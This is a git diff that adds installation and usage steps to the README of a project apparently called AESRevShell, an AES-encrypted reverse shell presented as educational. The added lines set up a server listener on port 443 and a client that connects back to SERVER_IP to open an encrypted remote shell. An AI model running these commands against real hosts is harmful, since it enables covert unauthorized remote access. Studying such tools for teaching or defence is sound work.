@@ -16,3 +16,15 @@ This project is intended for educational purposes and to demonstrate how AES enc
 ![image](https://github.com/user-attachments/assets/fa632162-df75-4409-9db0-ddffb113dbb4)
 ![image](https://github.com/user-attachments/assets/afabc598-1cd5-4205-89aa-f32b6a2a5361)
 
+## Installation
+- `sudo apt update && sudo apt install -y python3-pip`
+- `python3 -m pip install --upgrade cryptography`
+- `git clone https://github.com/OusCyb3rH4ck/AESRevShell`
+- `cd AESRevShell`
+- `chmod +x client.py server.py`
+
+## Usage (for server)
+- `./server.py -i 0.0.0.0 -p 443` ***(put any port you want)***
+
+## Usage (for client)
+- `./client -s SERVER_IP -p PORT -k AES_KEY -v AES_IV` ***(all proportioned by the server)***
